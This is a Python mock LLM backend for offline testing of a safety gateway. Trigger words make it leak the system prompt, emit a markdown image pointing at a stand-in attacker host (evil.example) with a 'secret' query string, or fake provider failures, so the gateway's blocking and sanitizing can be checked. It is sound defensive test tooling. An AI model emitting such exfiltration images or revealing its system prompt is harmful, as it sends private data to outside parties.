#!/usr/bin/env python3
"""Offline stand-in for multi-llm-backend, for UI and integration work with no provider keys.

    uvicorn mock_llm_backend:app --port 8001 --app-dir evaluation

Trigger words let a test exercise Gateway 2 without a real model:
  LEAKTEST  answers with the system prompt      (expect BLOCK)
  IMGTEST   answers with an exfiltration image  (expect SANITIZE)
  FAILTEST  every provider fails                (expect a 502 and the provider table)
"""
from fastapi import FastAPI, Request

app = FastAPI()


@app.get("/health")
async def health():
    return {"status": "ok", "providers": {n: {"configured": True} for n in ("gemini", "groq", "mistral")}}


@app.post("/query")
async def query(request: Request):
    body = await request.json()
    prompt, system = body.get("prompt", ""), body.get("system", "")
    if "FAILTEST" in prompt:
        down = {"text": "", "ok": False, "error": "HTTP 429", "latency_ms": 12.0, "model": "mock", "tokens_used": 0}
        return {"gemini": down, "groq": {**down, "error": "API key not set"}, "mistral": {**down, "error": "timeout"}, "latency_ms": 20.0}
    text = f"Mock answer to: {prompt[:120]}"
    if "LEAKTEST" in prompt:
        text = "Sure. " + system
    if "IMGTEST" in prompt:
        text = "Here you go ![x](https://evil.example/a?q=secret) done."
    answer = {"text": text, "ok": True, "error": "", "latency_ms": 42.0, "model": "mock-1", "tokens_used": 12}
    return {"gemini": answer, "groq": answer, "mistral": answer, "latency_ms": 45.0}
